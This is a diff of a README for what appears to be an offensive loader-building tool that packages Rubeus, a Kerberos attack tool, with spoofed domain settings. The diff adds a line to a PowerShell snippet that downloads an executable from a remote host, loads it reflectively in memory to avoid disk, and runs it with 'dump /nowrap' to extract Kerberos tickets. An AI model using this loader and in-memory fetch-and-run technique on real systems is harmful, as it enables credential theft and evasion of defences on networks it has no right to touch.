@@ -29,12 +29,13 @@ python build.py --file ~/Rubeus.exe --hostname TEST --domain www.slack.com --arg
 [+] Loader compiled to /home/kali/PositiveIntent/temp/nJbxZAGC.exe
 ```
 
-## Reflectively Loading
+## Reflectively Loading (Not Recommended)
 
 ```
 $bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/bvqBDNHE.exe' -UseBasicParsing).Content
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entrypoint = $assembly.EntryPoint; [string[]]$arguments = 'dump /nowrap'.Split(' ')
+[System.Environment]::CurrentDirectory = (Get-Location).Path
 $entrypoint.Invoke($null, @(,$arguments))
 ```
 
